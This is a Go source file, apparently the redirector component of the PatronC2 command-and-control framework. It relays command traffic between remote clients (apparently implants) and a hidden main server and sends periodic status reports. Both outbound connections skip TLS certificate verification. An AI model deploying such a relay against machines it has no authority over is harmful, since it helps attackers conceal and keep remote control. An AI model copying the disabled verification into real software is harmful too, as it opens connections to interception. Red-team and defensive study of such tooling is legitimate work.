package main

import (
	"bytes"
	"crypto/tls"
	"encoding/gob"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"

    "github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
)

var (
	mainServerIP    = os.Getenv("MAIN_SERVER_IP")
	mainServerPort  = os.Getenv("MAIN_SERVER_PORT")
	forwarderIP     = os.Getenv("FORWARDER_IP")
	forwarderPort   = os.Getenv("FORWARDER_PORT")
	apiIP           = os.Getenv("API_IP")
	apiPort         = os.Getenv("API_PORT")
	linkingKey      = os.Getenv("LINKING_KEY")
	certFile        = "certs/server.pem"
	keyFile         = "certs/server.key"
)

func main() {
	enableLogging := true
	logger.EnableLogging(enableLogging)
    registerGobTypes()

	// Set the log file
	logFileName := "logs/forwarder.log"
	err := logger.SetLogFile(logFileName)
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
		return
	}

	// Load TLS certificate for the listener
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		logger.Logf(logger.Warning, "Failed to load certificate: %v", err)
	}

	// TLS configuration for incoming connections
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}}

	// Start listening on forwarder IP and port
	listener, err := tls.Listen("tcp", forwarderIP+":"+forwarderPort, tlsConfig)
	if err != nil {
		logger.Logf(logger.Warning, "Failed to start listener: %v\n", err)
		return
	}
	defer listener.Close()
	logger.Logf(logger.Info, "Forwarder listening on %s:%s", forwarderIP, forwarderPort)

	go func() {
		for {
			err := sendStatusUpdate()
			if err != nil {
				logger.Logf(logger.Warning, "Error sending status update: %v", err)
			}
			time.Sleep(5 * time.Minute)
		}
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Logf(logger.Warning, "Failed to accept connection: %v\n", err)
			continue
		}
		go handleClientConnection(conn)
	}
}

func registerGobTypes() {
	for _, t := range []interface{}{
		types.Request{}, types.ConfigurationRequest{}, types.ConfigurationResponse{},
		types.CommandRequest{}, types.CommandResponse{}, types.CommandStatusRequest{},
	} {
		gob.Register(t)
	}
}

func sendStatusUpdate() error {
	url := fmt.Sprintf("https://%s:%s/api/redirector/status", apiIP, apiPort)
	data := map[string]string{
		"linking_key": linkingKey,
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %w", err)
	}

	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("received non-OK response: %s", resp.Status)
	}

	return nil
}

func handleClientConnection(clientConn net.Conn) {
	defer clientConn.Close()

	for {
		mainConn, err := connectToMainServer()
		if err != nil {
			logger.Logf(logger.Warning, "Main server unavailable, retrying in 5 seconds: %v\n", err)
			time.Sleep(5 * time.Second)
			continue
		}
		defer mainConn.Close()

		clientAddr := clientConn.RemoteAddr().String()
		logger.Logf(logger.Info, "Accepted connection from %s\n", clientAddr)

		data := make([]byte, 4096)
		n, err := clientConn.Read(data)
		if err != nil {
			logger.Logf(logger.Warning, "Read error from client %s: %v\n", clientAddr, err)
			return
		}
		clientData := string(data[:n])

		_, err = mainConn.Write([]byte(clientData))
		if err != nil {
			logger.Logf(logger.Warning, "Failed to send data to main server: %v\n", err)
			return
		}

		var serverResponse string
		dec := gob.NewDecoder(mainConn)
		if err := dec.Decode(&serverResponse); err != nil {
			logger.Logf(logger.Warning, "Failed to decode response from main server: %v\n", err)
			return
		}

		gob.NewEncoder(clientConn).Encode(serverResponse)
	}
}

func connectToMainServer() (*tls.Conn, error) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load certificate: %w", err)
	}
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	return tls.Dial("tcp", mainServerIP+":"+mainServerPort, tlsConfig)
}
